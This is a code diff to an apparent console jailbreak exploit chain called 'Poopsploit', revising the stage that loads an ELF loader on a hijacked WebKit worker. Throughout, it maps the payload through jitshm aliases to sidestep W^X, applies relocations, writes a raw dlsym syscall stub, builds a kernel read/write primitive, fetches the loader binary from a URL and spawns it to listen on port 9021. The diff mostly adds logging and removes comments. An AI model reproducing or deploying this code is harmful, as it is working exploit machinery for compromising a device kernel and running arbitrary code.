@@ -837,9 +837,11 @@ function beacon(m) {
      * or the host is gone, the line is still visible on the TV. */
     const scr = window.slopkit && window.slopkit.screenLine;
     if (scr) { try { scr(m); } catch (e) { /* ignore */ } }
+    const htmlLog = window.__slopkit_log;
+    if (htmlLog) { try { htmlLog("[NC] " + m, "info"); } catch (e) { /* ignore */ } }
     const b = window.slopkit && window.slopkit.mark;
     if (b) { try { b("NC " + m); return; } catch (e) { /* fall through */ } }
-    if (!scr) console.log(m);
+    if (!scr && !htmlLog) console.log(m);
 }
 
 /* Resolve a libkernel symbol via the KERNEL dlsym (sys_dynlib_dlsym, syscall
@@ -3597,8 +3599,9 @@ function run() {
     }
 
     function loadElfldr() {
+        beacon("elfldr: fetching binary...");
         const buf = fetchBytes(ELFLDR_URL);
-        beacon("elfldr fetched " + buf.length + "B");
+        beacon("elfldr: fetched " + buf.length + "B");
         const u16 = (o) => (buf[o] | (buf[o + 1] << 8)) & 0xffff;
         const u32 = (o) => (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
         const u64 = (o) => BigInt(u32(o)) | (BigInt(u32(o + 4)) << 32n);
@@ -3626,37 +3629,23 @@ function run() {
             throw new Error("elfldr: vaddr 0x" + va.toString(16) + " not in a LOAD seg");
         };
 
-        /* Map the image the way umtx2 does: the executable segment gets a
-         * jitshm exec mapping plus a writable alias of the same pages, and the
-         * data segments get ordinary anonymous RW memory. Everything is
-         * MAP_FIXED at a chosen base so segment vaddrs keep their relative
-         * layout — which is required, because the relocations and all the
-         * image's internal references assume it.
-         *
-         * The important consequence: elfldr's text is never writable and its
-         * data is never executable, so no page violates W^X and no kernel
-         * protection bits are patched for the image at all. Writes to text
-         * (segment copy and relocations landing in it) are redirected through
-         * the alias.
-         *
-         * elfldr's own LOAD0 is flagged RWX (0x7) rather than RX, so key the
-         * exec/data split on PF_X rather than on an exact flag match. */
         const PF_X = 1;
         const span = (maxva + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
         const IMAGE_BASE  = 0x0000000926100000n;   // fixed, as umtx2 does
         const SHADOW_BASE = 0x0000000920100000n;   // writable alias of the text
 
+        beacon("elfldr: mapping " + loads.length + " LOAD segs, span=0x" + span.toString(16));
+
         let textEnd = 0, shadow = 0n;
         for (const s of loads) {
             const alen = (s.pmsz + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
             if (s.pflags & PF_X) {
+                beacon("elfldr: jitshm text seg vaddr=0x" + s.pva.toString(16) + " len=0x" + alen.toString(16));
                 const pair = jitshmPair(IMAGE_BASE + BigInt(s.pva), SHADOW_BASE, alen);
                 shadow = pair.write;
                 textEnd = s.pva + s.pmsz;
             } else {
-                // fd as an explicit unsigned 64-bit -1: wr64at BigInt()s the
-                // value straight into memory, and a negative BigInt there is
-                // not what the stub's `mov r8, [rbx+0x20]` should read.
+                beacon("elfldr: anon data seg vaddr=0x" + s.pva.toString(16) + " len=0x" + alen.toString(16));
                 const got = nativeMmap(IMAGE_BASE + BigInt(s.pva), alen,
                                        PROT_RW, MAP_ANON_PRIV_FIXED,
                                        0xFFFFFFFFFFFFFFFFn, 0);
@@ -3667,24 +3656,19 @@ function run() {
         }
         const base = IMAGE_BASE;
         if (!shadow) throw new Error("elfldr: no executable LOAD segment found");
-        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16)
-               + " shadow=" + hex(shadow) + " textEnd=0x" + textEnd.toString(16));
+        beacon("elfldr: mapped base=" + hex(base) + " shadow=" + hex(shadow));
 
-        /* Where a write for image offset `va` must actually go: inside the text
-         * segment it has to go through the writable alias, because the exec
-         * mapping is not writable. */
         const wdst = (va) => (va < textEnd) ? shadow + BigInt(va)
                                             : base + BigInt(va);
 
-        // copy LOAD segments, zero the bss tail
+        beacon("elfldr: copying segments...");
         for (const s of loads) {
             const dst = wdst(s.pva);
             writeBytes(dst, buf, s.poff, s.pfsz);
             for (let j = s.pfsz; j < s.pmsz; j++) R.wr8(dst, j, 0);
         }
-        beacon("elfldr segs copied (" + loads.length + ")");
+        beacon("elfldr: segments copied");
 
-        // apply R_X86_64_RELATIVE relocations from DYNAMIC (mirrors umtx2 loader)
         let relaOff = 0, relaSz = 0, relaEnt = 24;
         for (let o = v2o(dynva); ; o += 16) {
             const tag = Number(u64(o)), val = Number(u64(o + 8));
@@ -3698,30 +3682,23 @@ function run() {
             const ro = v2o(relaOff + i * relaEnt);
             const r_offset = u64(ro), r_info = u64(ro + 8), r_addend = u64(ro + 16);
             if (Number(r_info & 0xffffffffn) === R_X86_64_RELATIVE) {
-                /* The VALUE is always relative to the real image base, but the
-                 * WRITE has to go through the alias when the target lands in
-                 * the text segment — that mapping is execute-only-ish (RX) and
-                 * a direct store would fault. */
                 R.wr64(wdst(Number(r_offset)), base + r_addend);
                 nrel++;
             }
         }
-        beacon("elfldr relocs applied=" + nrel);
+        beacon("elfldr: relocs applied=" + nrel);
 
-        // No protection fixup needed: the exec mapping was created executable
-        // by jitshm and never had to be forced.
-
-        // native dlsym stub: mov r10,rcx; mov eax,0x24F; syscall; ret
+        beacon("elfldr: building dlsym stub...");
         const stub = mem.alloc(0x20);
         const sb = [0x49, 0x89, 0xCA, 0xB8, SYS_DYNLIB_DLSYM & 0xff,
                     (SYS_DYNLIB_DLSYM >> 8) & 0xff, 0, 0, 0x0F, 0x05, 0xC3];
         for (let i = 0; i < sb.length; i++) R.wr8(stub, i, sb[i]);
 
-        // KRW primitive elfldr expects (lapse) + kdata_base — the two deps
+        beacon("elfldr: building KRW primitive...");
         const krw = buildLapseKRW();
         const kdataBase = computeKdataBase();
+        beacon("elfldr: kdata_base=" + hex(kdataBase) + " kpipe=" + hex(krw.kpipeAddr));
 
-        // payload_args_t
         const rwpipe = mem.alloc(8);  wr32at(rwpipe, 0, krw.rwpipe[0]); wr32at(rwpipe, 4, krw.rwpipe[1]);
         const rwpair = mem.alloc(8);  wr32at(rwpair, 0, krw.rwpair[0]); wr32at(rwpair, 4, krw.rwpair[1]);
         const payloadout = mem.alloc(8); R.wr64(BigInt(payloadout), 0n);
@@ -3733,45 +3710,31 @@ function run() {
         wr64at(args, 0x20, kdataBase);
         wr64at(args, 0x28, BigInt(payloadout));
 
-        /* Spawn elfldr with libkernel's pthread_create, not raw thr_new.
-         *
-         * thr_new makes the CALLER build the thread: stack, and critically a
-         * TCB for %fs. What we handed it was a single self-pointer, which is
-         * not a TCB — no stack-guard canary, no errno slot, no dtv. Any libc
-         * call inside elfldr that reads %fs (and a stack-protected function
-         * reads the canary on entry) is then reading whatever follows that one
-         * qword. It may survive; it is not a thread.
-         *
-         * pthread_create(&tid, attr=NULL, entry, arg) does all of that properly
-         * and is four arguments, which our chain reaches — it is only mmap's
-         * sixth argument that is out of reach. umtx2 uses the same approach
-         * (pthread_create_name_np, the 5-arg named variant).
-         *
-         * Deliberately NOT joined. umtx2 can pthread_join because it drives ROP
-         * from a chain it owns; ours runs on a hijacked WebKit worker parked in
-         * cond_wait, and elfldr does not return while it is serving port 9021.
-         * Joining would block that worker inside the kernel forever, which is
-         * precisely the wedge state the run refuses to recover from. Poll
-         * payloadout from the main thread instead — same information, no risk
-         * to the worker. */
+        beacon("elfldr: spawning thread...");
         const pthreadCreate = libkernelFn("pthread_create");
         const tid = mem.alloc(8);
         R.wr64(BigInt(tid), 0n);
         const entry = base + BigInt(e_entry);
         const prv = Number(window.rop_worker.callSync(
             pthreadCreate, BigInt(tid), 0n, entry, BigInt(args)).retval) | 0;
-        beacon("elfldr pthread_create -> " + prv + " entry=" + hex(entry)
+        beacon("elfldr: pthread_create -> " + prv + " entry=" + hex(entry)
                + " tid=" + hex(R.rd64(BigInt(tid))));
         if (prv !== 0) throw new Error("elfldr: pthread_create returned " + prv);
 
-        // elfldr writes its result into payloadout on exit
+        beacon("elfldr: waiting for payloadout...");
         let out = 0n;
-        for (let i = 0; i < 60; i++) { out = R.rd64(BigInt(payloadout)); if (out !== 0n) break; }
-        beacon("elfldr out=" + hex(out) + (out === 0n ? " (running/listening 9021)" : ""));
-        // on-screen notification: elfldr is up (out==0 = still running/listening)
-        sendNotification(out === 0n
-            ? "Poopsploit: elfldr RUNNING - listening on port 9021"
-            : "Poopsploit: elfldr exited code=0x" + out.toString(16));
+        for (let i = 0; i < 60; i++) {
+            out = R.rd64(BigInt(payloadout));
+            if (out !== 0n) break;
+            // brief yield so elfldr has time to init before we read again
+            sys.sched_yield();
+        }
+        beacon("elfldr: out=" + hex(out) + (out === 0n ? " (running/listening 9021)" : " (EXITED)"));
+        if (out !== 0n) {
+            beacon("elfldr: ERROR exit code 0x" + out.toString(16));
+            return false;
+        }
+        sendNotification("Poopsploit: elfldr RUNNING - listening on port 9021");
         return true;
     }
 
